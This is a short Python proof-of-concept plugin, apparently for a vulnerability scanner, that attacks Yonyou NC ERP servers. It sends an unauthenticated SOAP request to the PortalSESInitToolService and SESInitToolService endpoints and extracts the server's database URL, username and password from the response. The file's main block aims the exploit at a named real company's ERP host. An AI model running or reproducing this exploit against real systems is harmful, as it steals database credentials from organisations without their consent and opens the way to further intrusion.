#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#http://wooyun.org/bugs/wooyun-2010-0112834
import re

def assign(service, arg):
    if service == "yongyou_nc":
        return True, arg

def poc(url):
    raw = """POST /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService HTTP/1.1
Host: www.baidu.com
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/47.0.2526.73 Chrome/47.0.2526.73 Safari/537.36
DNT: 1
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4
Cookie: JSESSIONID=8094FB584D86D05EC578B3DA1A08BBA8.server
Content-Length: 349

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><getDataSourceConfig xmlns="http://inittool.ses.itf.nc/PortalSESInitToolService"></getDataSourceConfig></soap:Body></soap:Envelope>"""

    code, head,res, errcode, _ = curl.curl2(url,raw=raw)
    if code == 200 and 'getDataSourceConfigResponse' in res:
        r = r'<ns1:getDataSourceConfigResponse xmlns:ns1="http://inittool.ses.itf.nc/\w+">(.+)</ns1:getDataSourceConfigResponse>'
        data = re.findall(r,res)
        if data:
            r = r'<return>(.+?)</return>'
            data = re.findall(r,data[0])
            if len(data) >= 4:
                text = "url->%s\r\nu->%s\r\np->%s\r\n"%(data[1],data[2],data[3])
                security_warning(text)

def audit(arg):
    url = arg + "uapws/service/nc.itf.ses.inittool.PortalSESInitToolService"
    poc(url)
    url = arg + "uapws/service/nc.itf.ses.inittool.SESInitToolService"
    poc(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_nc', 'http://erp.suning.com.cn/')[1])
